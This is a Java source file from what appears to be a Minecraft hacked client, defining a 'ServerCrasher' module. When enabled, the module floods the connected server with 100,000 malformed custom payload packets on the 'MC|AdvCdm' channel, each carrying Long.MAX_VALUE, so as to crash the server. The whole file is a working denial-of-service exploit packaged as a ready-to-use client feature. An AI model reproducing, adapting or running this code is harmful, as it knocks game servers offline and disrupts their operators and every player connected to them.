package store.shadowclient.client.module.misc;

import io.netty.buffer.Unpooled;
import store.shadowclient.client.module.Category;
import store.shadowclient.client.module.Module;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class ServerCrasher extends Module {

	public ServerCrasher() {
		super("ServerCrasher", 0, Category.MISC);
	}

	@Override
	public void onEnable() {
		PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
		packetbuffer.writeLong(Long.MAX_VALUE);
		
		for(int i = 0; i < 100000; ++i) {
			mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
		}
		super.onEnable();
	}
	
	@Override
	public void onDisable() {
		super.onDisable();
	}
}
